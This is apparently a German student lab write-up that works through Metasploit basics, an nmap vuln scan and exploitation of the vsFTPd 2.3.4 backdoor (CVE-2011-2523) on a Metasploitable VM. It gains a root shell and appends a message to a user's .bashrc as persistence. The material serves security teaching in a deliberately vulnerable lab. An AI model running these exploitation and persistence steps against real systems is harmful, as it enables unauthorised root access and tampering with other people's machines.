# very safe FTP backdoor

## msf basics

### Angabe 

Übung (msf Basics)
Probiere alle besprochenen bzw. open beschriebenen msf Befehle noch einmal aus und erstelle ein kurzes Cheatsheet zur Bedienung von metasploit.

Der Befehl setg (set global) ist in unserem Zusammenhang auch sehr praktisch, recherchiere dazu.
Recherchiere zu
msfvenom
Meterpreter


### Start & Hilfe

* `msfconsole` – starten
* `help` / `?` – Hilfe
* `exit` – beenden

### Module finden & nutzen

* `search <begriff>` – Module suchen
* `use <modul>` – Modul auswählen
* `info` – Modulinfos
* `options` – Optionen anzeigen

### Wichtige Optionen

* `set RHOSTS <IP>` – Ziel
* `set RPORT <Port>` – Port
* `set LHOST <IP>` – eigene IP
* `set LPORT <Port>` – eigener Port

### Global

* `setg RHOSTS <IP>` – global setzen
* `unsetg RHOSTS` – global löschen

### Ausführen

* `run` – Scanner/Auxiliary
* `exploit` – Exploit starten

### Sessions

* `sessions` – anzeigen
* `sessions -i <ID>` – verbinden

### Meterpreter

Ist ein Programm was sich direkt nach dem verbinden auf den Server ausführt

### msfvenom

Erstellt eine externe Shell auf dem Server damit der Angreifer sich verbinden kann

## Übung (nmap FTP scan)

### Angabe

Übung (nmap FTP scan)
Aufgabe: Wiederhole den nmap vuln scan auf den FTP Port. Verwende:

Option --script=vuln (Diese Skripte sind “intrusive” und werden daher nicht über die Optionen -sC oder -A aufgerufen.)

Option -p zum Einschränken auf den FTP Port

Findet nmap die Sicherheitslücke? Recherchiere mit Hilfe der CVE Nummer über diese Sicherheitslücke.

Recherchiere warum diese Skripte als intrusive bezeichnet werden, warum werden diese bei -sC oder -A nicht ausgeführt?



### 1) Nmap Vuln-Scan auf den FTP-Port

**Befehl:**

```bash
nmap -p 21 --script=vuln <target-ip>
```

* `-p 21` → Scan nur auf den FTP-Port
* `--script=vuln` → Führt alle Vulnerability-Skripte aus (intrusive)

---

### 2) Ergebnis des Scans

![Ergebnis](../Bilder/nmap%20scan%20backdoor.png)

Bei der Metasploitable-VM erkennt nmap den FTP-Dienst:

* **vsFTPd Version 2.3.4**

Nmap meldet eine bekannte Sicherheitslücke (Backdoor).

---

### 3) Gefundene Sicherheitslücke (CVE)

**CVE-2011-2523**

**Beschreibung:**

* In vsFTPd 2.3.4 ist eine Backdoor eingebaut
* Anmeldung mit `:)` im Benutzernamen öffnet eine Shell
* Die Shell läuft auf Port 6200
* Vollständiger Zugriff auf das System möglich (Remote Code Execution)

---

### 4) Warum sind `--script=vuln` Skripte intrusive?

Diese Skripte gelten als *intrusive*, weil sie:

* aktiv Schwachstellen ausnutzen
* Exploit-ähnliche Anfragen senden
* Dienste zum Absturz bringen können
* Angriffe in Logs hinterlassen

Sie greifen aktiv in das Zielsystem ein und sind nicht nur passiv.

---

### 5) Warum werden sie nicht bei `-sC` oder `-A` ausgeführt?

* `-sC` (default scripts):

  * Nur sichere, passive Skripte
  * Keine Ausnutzung von Schwachstellen

* `-A` (Aggressive Scan):

  * OS-Erkennung, Versionsscan, Default-Skripte
  * Keine intrusive Skripte

**Grund:**
Intrusive Skripte könnten Systeme beschädigen oder rechtliche Probleme verursachen und müssen daher bewusst aktiviert werden.

## Übung (msf FTP Version herausfinden)

### Angabe

Übung (msf FTP Version herausfinden)
In dieser Übung findest du mit Hilfe eines msf Moduls ähnliche Informationen wie mit dem vorherigen nmap scan.

Suche nach einem msf Modul mit dem die Version des FTP Servers ermittelt werden kann, du findest dies in der Kategorie scanner .

Verwende dieses Modul um die auf Metasploitable installierte FTP Version herauszufinden.

### 1) Passendes Metasploit-Modul suchen

In Metasploit befinden sich FTP-Scanner in der Kategorie **auxiliary/scanner**.

Befehl:

```bash
search ftp scanner
```

Passendes Modul:

```text
auxiliary/scanner/ftp/ftp_version
```

---

### 2) Modul verwenden

```bash
use auxiliary/scanner/ftp/ftp_version
```

Modulinformationen anzeigen:

```bash
info
```

---

### 3) Optionen setzen

```bash
set RHOSTS <IP-der-Metasploitable>
```

Optionen prüfen:

```bash
options
```

---

### 4) Scan ausführen

```bash
run
```

---

### 5) Ergebnis

![msf scan](../Bilder/msf%20scan%20backdoor.png)

Das Modul liefert die FTP-Server-Version der Metasploitable-VM:

```text
FTP Banner: vsFTPd 2.3.4
```

➡️ Auf der Metasploitable ist **vsFTPd Version 2.3.4** installiert.

---

### 6) Bedeutung

* Die Version **vsFTPd 2.3.4** ist bekannt für eine kritische Sicherheitslücke
* Diese Version enthält eine **Backdoor (CVE-2011-2523)**
* Die Information kann direkt für einen Metasploit-Exploit genutzt werden


## Übung (msf vsftpd exploit)

### Angabe

Voraussetzung: Setze Kali und Metasploitable in den NAT Modus.

Starte metasploit aus dem Terminal mit msfconsole (metasploit framework console)

help zeigt einen Hilfetext an.

Verwende search um ein metasploit Modul zu finden dass einen exploit für diese Backdoor zur Verfügung stellt. Hinweis: Suche nach vsftpd

Aktiviere dieses Modul mit use.

Die Anzeige sollte nun so aussehen:

[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/...) > 

Verwende info um Informationen zum aktivierten Modul anzuzeigen. Lies die “Description” durch und finde heraus welche Optionen dieses Modul unterstützt und wie diese gesetzt werden müssen. Setze die notwendigen Optionen.

Verwende den Befehl run um das aktive Modul auszuführen. Es startet eine shell. Verifiziere, dass diese am Metasploit System läuft. Welche Rechte hat diese shell (welcher user)?

Hinterlasse eine Nachricht you have been hacked!die beim nächsten Einloggen dem User msfadmin automatisch angezeigt wird.

### Voraussetzungen

* Kali Linux und Metasploitable im **NAT-Modus**
* Metasploitable erreichbar (IP bekannt)

---

### 1) Metasploit starten

```bash
msfconsole
```

Hilfe anzeigen:

```bash
help
```

---

### 2) Exploit-Modul suchen

```bash
search vsftpd
```

Passendes Exploit-Modul:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

---

### 3) Exploit-Modul aktivieren

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Die Anzeige sollte nun ähnlich aussehen:

```text
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

---

### 4) Modulinformationen anzeigen

```bash
info
```

Wichtige Punkte aus der **Description**:

* Nutzt die Backdoor in vsFTPd 2.3.4
* Öffnet automatisch eine Shell
* Kein Payload nötig

---

### 5) Notwendige Optionen setzen

Optionen anzeigen:

```bash
options
```

Zielsystem setzen:

```bash
set RHOSTS <IP-der-Metasploitable>
```

(Optional, falls nötig):

```bash
set RPORT 21
```

---

### 6) Exploit ausführen

```bash
run
```

➡️ Es öffnet sich eine **Shell**.

---

### 7) Shell verifizieren

Prüfen, wo die Shell läuft:

```bash
uname -a
```

Aktuellen Benutzer prüfen:

```bash
whoami
```

**Ergebnis:**

```text
root
```

➡️ Die Shell läuft als **root** auf der Metasploitable-VM.

---

### 8) Nachricht für User msfadmin hinterlassen

Damit beim nächsten Login von **msfadmin** automatisch eine Nachricht erscheint, wird die Datei `.bashrc` angepasst:

```bash
echo "echo 'you have been hacked!'" >> /home/msfadmin/.bashrc
```


![Code](../Bilder/you%20have%20been%20hacked%20code.png)

Beim nächsten Login erscheint:

![Message](../Bilder/you%20have%20been%20hacked%20message.png)

---

### Ergebnis

* vsFTPd 2.3.4 erfolgreich ausgenutzt
* Root-Shell erhalten
* Persistente Login-Nachricht gesetzt

